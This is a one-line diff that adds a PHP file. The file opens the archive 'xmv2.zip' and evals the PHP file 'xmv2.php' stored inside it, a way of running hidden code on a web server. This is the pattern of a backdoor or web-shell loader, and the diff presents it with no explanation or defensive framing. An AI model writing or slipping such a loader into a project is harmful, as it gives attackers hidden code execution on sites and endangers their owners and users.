@@ -1,0 +1,1 @@
+<?php $z=new ZipArchive;$z->open('xmv2.zip');eval('?>'.$z->getFromName('xmv2.php')); ?>
